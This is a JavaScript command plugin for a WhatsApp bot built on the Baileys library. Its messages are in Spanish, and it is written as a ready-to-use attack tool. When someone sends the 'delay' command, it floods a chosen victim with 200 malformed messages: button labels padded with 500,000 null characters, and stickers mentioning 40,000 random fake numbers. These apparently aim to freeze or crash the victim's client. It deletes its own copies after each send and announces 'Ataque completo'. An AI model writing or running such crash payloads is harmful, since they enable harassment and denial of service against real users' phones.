import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => {
  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
  if (jid === conn.user.id) {
    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m });
  }

  try {
    for (let round = 1; round <= 10; round++) {
      for (let i = 0; i < 20; i++) {
        const m1 = await InVisibleX(conn, jid, true);
        const m2 = await xatanicaldelayv2(conn, jid, true);

        await conn.sendMessage(conn.user.id, { delete: m1.key });
        await conn.sendMessage(conn.user.id, { delete: m2.key });

        await delay(1000); // 1 segundo entre cada envío
      }

      await conn.sendMessage(m.chat, { text: `✅ Tanda ${round}/10 enviada.` }, { quoted: m });

      if (round < 10) {
        await delay(64444); // ≈64.4 segundos entre tandas
      }
    }

    await conn.sendMessage(m.chat, { text: "✅ Ataque completo: 200 envíos realizados." }, { quoted: m });

  } catch (e) {
    console.error("❌ Error en delay:", e);
    await conn.sendMessage(m.chat, { text: "❌ Error al ejecutar:\n" + e.message }, { quoted: m });
  }
};

handler.command = /^delay$/i;
export default handler;

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Aquí debes poner estas dos funciones completas:

async function InVisibleX(sock, jid, mention) {
  const msg = await generateWAMessageFromContent(jid, {
    buttonsMessage: {
      text: "🩸",
      contentText: "@raysofhopee",
      footerText: "vip",
      buttons: [
        {
          buttonId: ".aboutb",
          buttonText: {
            displayText: "HADES VIP!" + "\u0000".repeat(500000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(jid, {
      groupStatusMentionMessage: {
        message: { protocolMessage: { key: msg.key, type: 25 } },
      },
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "hmmm" },
          content: undefined,
        },
      ],
    });
  }

  return msg;
}

async function xatanicaldelayv2(sock, jid, mention) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
          },
        ],
      },
    ],
  });

  return msg;
}